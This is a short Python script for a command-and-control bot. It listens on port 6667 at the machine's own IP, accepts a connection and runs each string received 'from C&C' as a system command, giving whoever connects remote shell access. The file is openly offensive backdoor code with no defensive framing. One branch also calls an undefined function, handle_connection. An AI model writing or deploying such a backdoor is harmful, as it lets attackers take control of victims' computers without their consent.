import socket
import subprocess

def get_my_ip():
    cmd = ['hostname', '-I']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    my_ip = o.decode('ascii')
    return my_ip[:-2]

def exec_dos(cmd):
    cmd = cmd.split()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    res = o.decode('ascii')
    return res

def handle_irc_connection(server_socket):
    conn, address = server_socket.accept()
    print("[+] Got connection from: " + str(address))

    while True:
        data = conn.recv(1024).decode()
        if not data or data == "kill" or data == 'exit':
            break
        data = str(data)
        print("from C&C: " + data)
        print(exec_dos(data))

    conn.close()  # close the connection

    if data == 'exit':
        return handle_connection(server_socket)
    # else 
    print("[-] Killing bot")
    return 1

def set_up_irc():
    host = get_my_ip()
    port = 6667
    clients = 1

    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    print(f"-- irc listening ({host}, {port}) --")

    server_socket.listen(clients)

    handle_irc_connection(server_socket)
    return 1